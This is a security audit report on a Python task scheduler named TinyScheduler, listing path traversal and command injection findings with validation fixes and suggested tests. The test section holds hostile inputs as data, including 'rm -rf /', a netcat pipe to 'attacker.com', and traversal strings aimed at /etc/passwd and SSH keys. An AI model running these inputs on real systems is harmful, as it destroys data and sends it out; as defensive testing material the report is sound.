# TinyScheduler Security Audit Report

**Date**: 2026-01-20  
**Auditor**: Security Review Mode  
**Scope**: Full codebase security review prior to initial commit  
**Status**: ⚠️ CRITICAL ISSUES FOUND - MUST FIX BEFORE DEPLOYMENT

---

## Executive Summary

This security audit identified **3 CRITICAL**, **4 MODERATE**, and **3 MINOR** security issues in the TinyScheduler codebase. The most severe issues involve **command injection vulnerabilities** and **path traversal attacks** that could allow attackers to execute arbitrary code or access unauthorized files.

**RECOMMENDATION**: Do not deploy to production until critical issues are resolved.

---

## Critical Issues (Must Fix)

### 🔴 CRITICAL-1: Command Injection via Unvalidated Input
**File**: [`src/scheduler/scheduler.py:531-542`](src/scheduler/scheduler.py:531)  
**Severity**: CRITICAL  
**CWE**: CWE-78 (OS Command Injection)

**Description**: The `_spawn_wrapper()` method passes user-controllable inputs (`task_id`, `agent`, `recipe`) directly to `subprocess.Popen()` without validation.

```python
cmd = [
    sys.executable,
    str(wrapper_script),
    '--task-id', task_id,      # ❌ Not validated
    '--agent', agent,           # ❌ Not validated  
    '--recipe', recipe,         # ❌ Not validated
    '--lease-dir', str(self.config.running_dir),
    '--goose-bin', str(self.config.goose_bin),
    '--mcp-endpoint', self.config.mcp_endpoint,
    '--heartbeat-interval', str(self.config.heartbeat_interval_sec),
    '--hostname', self.config.hostname,
]
```

**Attack Vector**: Malicious task_id like `"../../etc/passwd"` or agent name with shell metacharacters could be exploited.

**Mitigation**:
```python
import re

def validate_identifier(value: str, name: str) -> str:
    """Validate alphanumeric identifiers with hyphens/underscores."""
    if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', value):
        raise ValueError(f"Invalid {name}: {value}")
    return value

# In _spawn_wrapper:
task_id = validate_identifier(task_id, 'task_id')
agent = validate_identifier(agent, 'agent')
```

---

### 🔴 CRITICAL-2: Path Traversal in Lease File Operations
**File**: [`src/scheduler/lease.py:135-145`](src/scheduler/lease.py:135)  
**Severity**: CRITICAL  
**CWE**: CWE-22 (Path Traversal)

**Description**: The `_lease_path()` method constructs file paths using unsanitized `task_id`:

```python
def _lease_path(self, task_id: str) -> Path:
    return self.lease_dir / f"task_{task_id}.json"
```

**Attack Vector**: A malicious `task_id` like `"../../../root/.ssh/authorized_keys"` could allow reading/writing arbitrary files.

**Mitigation**:
```python
def _lease_path(self, task_id: str) -> Path:
    # Validate task_id contains only safe characters
    if not re.match(r'^[a-zA-Z0-9_-]{1,64}$', task_id):
        raise ValueError(f"Invalid task_id: {task_id}")
    
    lease_path = self.lease_dir / f"task_{task_id}.json"
    
    # Ensure path is within lease_dir (prevent symlink/traversal)
    try:
        lease_path.resolve().relative_to(self.lease_dir.resolve())
    except ValueError:
        raise ValueError(f"Path traversal detected in task_id: {task_id}")
    
    return lease_path
```

---

### 🔴 CRITICAL-3: Recipe Path Traversal
**File**: [`src/scheduler/scheduler.py:362-367`](src/scheduler/scheduler.py:362)  
**Severity**: CRITICAL  
**CWE**: CWE-22 (Path Traversal)

**Description**: Recipe filenames from tasks are used to construct file paths without validation:

```python
recipe = task.recipe or f"{agent}.yaml"
recipe_path = self.config.recipes_dir / recipe  # ❌ Not validated

if not recipe_path.exists():
    self.logger.warning(f"Recipe not found: {recipe_path}")
```

**Attack Vector**: A malicious recipe value like `"../../etc/passwd"` could be used to access arbitrary files.

**Mitigation**:
```python
def validate_recipe_path(self, recipe: str) -> Path:
    """Validate and resolve recipe path safely."""
    # Reject absolute paths and parent directory references
    if Path(recipe).is_absolute() or '..' in Path(recipe).parts:
        raise ValueError(f"Invalid recipe path: {recipe}")
    
    # Only allow .yaml and .yml extensions
    if not recipe.endswith(('.yaml', '.yml')):
        raise ValueError(f"Recipe must be .yaml or .yml: {recipe}")
    
    recipe_path = (self.config.recipes_dir / recipe).resolve()
    
    # Ensure path is within recipes_dir
    try:
        recipe_path.relative_to(self.config.recipes_dir.resolve())
    except ValueError:
        raise ValueError(f"Recipe path outside recipes directory: {recipe}")
    
    return recipe_path
```

---

## Moderate Issues (Should Fix)

### 🟡 MODERATE-1: Monolithic File Exceeding Size Limit
**File**: [`src/scheduler/scheduler.py`](src/scheduler/scheduler.py)  
**Severity**: MODERATE (Code Quality/Maintainability)  
**Lines**: 675 (exceeds 500 line limit)

**Description**: The scheduler.py file is monolithic and difficult to maintain, test, and review for security issues.

**Mitigation**:
- Extract LockFile class to `src/scheduler/lock.py`
- Extract subprocess spawning logic to `src/scheduler/process_manager.py`
- Extract reconciliation statistics to `src/scheduler/stats.py`
- Target: <300 lines per file

---

### 🟡 MODERATE-2: Insufficient Input Validation
**Files**: Multiple  
**Severity**: MODERATE  
**CWE**: CWE-20 (Improper Input Validation)

**Missing Validations**:
1. **Agent names** - No validation before use in file paths and commands
2. **MCP endpoint URLs** - Basic format check only, no SSRF protection
3. **JSON size limits** - No max file size for agent-control.json or lease files
4. **Hostname** - From `socket.gethostname()` without sanitization

**Mitigation**:
```python
def validate_mcp_endpoint(endpoint: str) -> str:
    """Validate MCP endpoint URL."""
    from urllib.parse import urlparse
    
    parsed = urlparse(endpoint)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Invalid protocol: {parsed.scheme}")
    
    # Block internal/private IPs in production
    if parsed.hostname in ('localhost', '127.0.0.1', '0.0.0.0'):
        # Warn but allow in development
        pass
    
    return endpoint

def validate_json_file_size(file_path: Path, max_size_mb: int = 10) -> None:
    """Validate JSON file size before parsing."""
    size_mb = file_path.stat().st_size / (1024 * 1024)
    if size_mb > max_size_mb:
        raise ValueError(f"File too large: {size_mb:.2f}MB > {max_size_mb}MB")
```

---

### 🟡 MODERATE-3: Insecure Default Configuration
**File**: [`src/scheduler/config.py:72-144`](src/scheduler/config.py:72)  
**Severity**: MODERATE  
**CWE**: CWE-1188 (Insecure Default Configuration)

**Issues**:
1. Default MCP endpoint uses HTTP instead of HTTPS: `http://localhost:3000`
2. Hardcoded absolute paths: `/home/user/workspace/calypso`, `/root/.local/bin/goose`
3. Scheduler disabled by default (`enabled=false`) - could be overlooked

**Mitigation**:
```python
# Use environment-based defaults
base_path_str = os.getenv("TINYSCHEDULER_BASE_PATH", str(Path.cwd()))

# Warn on insecure defaults
if mcp_endpoint.startswith('http://') and not mcp_endpoint.startswith('http://localhost'):
    import warnings
    warnings.warn("Using HTTP MCP endpoint in production is insecure")
```

---

### 🟡 MODERATE-4: Missing File Permission Controls
**Files**: [`src/scheduler/lease.py`](src/scheduler/lease.py), [`src/file_manager.py`](src/file_manager.py)  
**Severity**: MODERATE  
**CWE**: CWE-732 (Incorrect Permission Assignment)

**Description**: Files created without explicit permissions (relies on umask). Lease files may contain sensitive task information.

**Mitigation**:
```python
# In lease creation
fd, temp_path = tempfile.mkstemp(
    dir=self.lease_dir,
    prefix=f"task_{lease.task_id}_",
    suffix=".tmp"
)

# Set restrictive permissions (owner read/write only)
os.chmod(temp_path, 0o600)

with os.fdopen(fd, 'w') as f:
    f.write(lease_data)
```

---

## Minor Issues (Consider Fixing)

### 🟢 MINOR-1: Information Disclosure in Logs
**Files**: Multiple  
**Severity**: MINOR  
**CWE**: CWE-532 (Information Exposure Through Log Files)

**Issues**:
- Full file paths exposed in error messages
- Stack traces with `exc_info=True` may leak sensitive context
- Configuration objects printed to logs include all settings

**Mitigation**:
```python
# Sanitize paths in production
def sanitize_path_for_log(path: Path) -> str:
    """Return relative path or filename only for logging."""
    if config.log_level == "DEBUG":
        return str(path)
    return path.name  # Just filename

# Use structured logging with field redaction
logger.info("Processing task", extra={
    "task_id": task_id,
    "agent": agent,
    # Don't log full paths in production
})
```

---

### 🟢 MINOR-2: Whisper Command Execution
**File**: [`src/utils/whisper_wrapper.py:113`](src/utils/whisper_wrapper.py:113)  
**Severity**: MINOR  
**CWE**: CWE-78 (OS Command Injection)

**Description**: While using list-style arguments (which is safe), paths are converted to strings without validation.

**Mitigation**:
```python
# Validate paths don't contain unusual characters
if not audio_file.exists():
    raise WhisperError(f"Audio file not found")

# Validate output_dir is within expected location
try:
    output_dir.resolve().relative_to(Path.cwd())
except ValueError:
    raise WhisperError("Output directory outside workspace")
```

---

### 🟢 MINOR-3: Environment Variable Exposure
**Files**: [`src/config.py`](src/config.py), [`src/scheduler/config.py`](src/scheduler/config.py)  
**Severity**: MINOR  
**CWE**: CWE-526 (Exposure of Sensitive Information Through Environment Variables)

**Description**: 13 environment variables used without validation. If environment is compromised, all config can be manipulated.

**Mitigation**:
- Document which environment variables are security-sensitive
- Add `.env.example` with safe defaults
- Validate environment values before use
- Consider using encrypted configuration management in production

---

## Secure Practices Observed ✅

1. **Atomic File Operations**: Proper temp + rename pattern with `fsync()` in [`lease.py`](src/scheduler/lease.py:164-181)
2. **No Hardcoded Secrets**: No API keys, passwords, or tokens found in source code
3. **Safe JSON Parsing**: Using standard library `json.load()` - no pickle or unsafe YAML
4. **Proper .gitignore**: `.env` files correctly excluded from version control
5. **Lock File Protection**: Prevents concurrent scheduler instances ([`scheduler.py:37-119`](src/scheduler/scheduler.py:37))
6. **Signal Handling**: Graceful shutdown on SIGTERM/SIGINT ([`scheduler.py:30-34`](src/scheduler/scheduler.py:30))
7. **PID Validation**: Checks process liveness before reclaiming leases ([`lease.py:337-356`](src/scheduler/lease.py:337))

---

## Recommendations Summary

### Immediate Actions (Before Initial Commit)
1. ✅ Add input validation module: `src/scheduler/validators.py`
2. ✅ Validate all user inputs (task_id, agent, recipe) before use
3. ✅ Add path traversal protection to all file operations
4. ✅ Add file size limits for JSON parsing
5. ✅ Set explicit file permissions on sensitive files

### Short-term (Before Production Deployment)
1. Refactor [`scheduler.py`](src/scheduler/scheduler.py) to multiple smaller files
2. Add HTTPS requirement for MCP endpoints in production
3. Implement structured logging with field sanitization
4. Add integration tests for security validations
5. Document security considerations in README

### Long-term (Future Enhancements)
1. Add rate limiting for API calls to MCP endpoint
2. Implement audit logging for all security-relevant events
3. Add security headers if exposing HTTP interface
4. Consider code signing for wrapper scripts
5. Implement secret management for sensitive configuration

---

## Testing Recommendations

### Security Test Cases to Add

```python
# test_security_validators.py

def test_task_id_path_traversal():
    """Ensure task_id cannot escape lease directory."""
    malicious_ids = [
        "../../../etc/passwd",
        "../../root/.ssh/authorized_keys",
        "..\\..\\windows\\system32",
        "task_id; rm -rf /",
        "task_id\x00.json",
    ]
    for task_id in malicious_ids:
        with pytest.raises(ValueError):
            lease_store._lease_path(task_id)

def test_recipe_path_traversal():
    """Ensure recipe cannot escape recipes directory."""
    malicious_recipes = [
        "../../../etc/passwd",
        "/etc/passwd",
        "subdir/../../etc/passwd",
        "recipe.txt",  # Wrong extension
    ]
    for recipe in malicious_recipes:
        with pytest.raises(ValueError):
            scheduler.validate_recipe_path(recipe)

def test_command_injection():
    """Ensure subprocess args are properly escaped."""
    malicious_inputs = [
        "task; rm -rf /",
        "task && malicious_command",
        "task | nc attacker.com 4444",
    ]
    # Validate these are rejected or safely escaped
```

---

## Compliance Notes

- **CWE Coverage**: Addresses CWE-22, CWE-78, CWE-20, CWE-732, CWE-532
- **OWASP Top 10**: Mitigates A03:2021 (Injection), A01:2021 (Broken Access Control)
- **File Size Policy**: [`scheduler.py`](src/scheduler/scheduler.py) exceeds 500-line limit (current: 675 lines)

---

## Audit Conclusion

The TinyScheduler codebase demonstrates good foundational security practices (atomic operations, no hardcoded secrets, proper locking), but has **critical input validation gaps** that must be addressed before production deployment.

**Overall Risk Rating**: ⚠️ **HIGH** (due to command injection and path traversal vulnerabilities)

**Recommendation**: Implement critical fixes (input validation, path sanitization) before initial commit. These issues are straightforward to fix and essential for secure operation.

---

## Appendix: File Analysis

### Files Analyzed
- Total Python files: 30+
- Lines of code analyzed: ~5,000+
- Critical files reviewed:
  - [`src/scheduler/scheduler.py`](src/scheduler/scheduler.py) (675 lines) ⚠️
  - [`src/scheduler/config.py`](src/scheduler/config.py) (420 lines)
  - [`src/scheduler/lease.py`](src/scheduler/lease.py) (424 lines)
  - [`src/scheduler/tinytask_client.py`](src/scheduler/tinytask_client.py)
  - [`src/utils/whisper_wrapper.py`](src/utils/whisper_wrapper.py)

### Security Tool Recommendations
- **Static Analysis**: `bandit`, `semgrep`, `pylint --rcfile=security`
- **Dependency Scanning**: `safety`, `pip-audit`
- **Secret Scanning**: `gitleaks`, `truffleHog`
- **Dynamic Testing**: Custom security test suite (see recommendations)

---

**Report Generated**: 2026-01-20T04:20:43Z  
**Next Review**: Before production deployment or after critical fixes
